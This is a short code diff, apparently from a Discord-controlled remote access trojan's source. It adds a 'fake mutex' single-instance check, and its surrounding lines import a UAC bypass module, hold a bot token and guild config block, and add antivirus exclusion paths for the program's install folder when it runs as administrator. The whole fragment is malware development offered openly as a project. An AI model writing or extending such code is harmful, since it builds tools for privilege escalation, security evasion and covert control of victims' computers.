@@ -28,7 +28,7 @@ def log(entry):
     with open(f'logs/{logs_file_name}', 'a', encoding='utf-8') as log_entry: log_entry.write(f'[{time.strftime("%Y.%m.%d-%H:%M:%S")}] {entry}\n')
 
 # [pysilon_var] $modules 0
-from resources.protections import protection_check
+from resources.protections import protection_check, fake_mutex_code
 from urllib.request import urlopen
 from resources.uac_bypass import *
 from itertools import islice
@@ -89,6 +89,9 @@ secret_key = ''                                                    ##
 guild_id = auto                                                    ##
 ## If you like this project, please leave me a Star on GitHub ;)   ##
 #####################################################################
+
+if fake_mutex_code(software_executable_name):
+    os._exit(0)
 
 if IsAdmin():
     exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
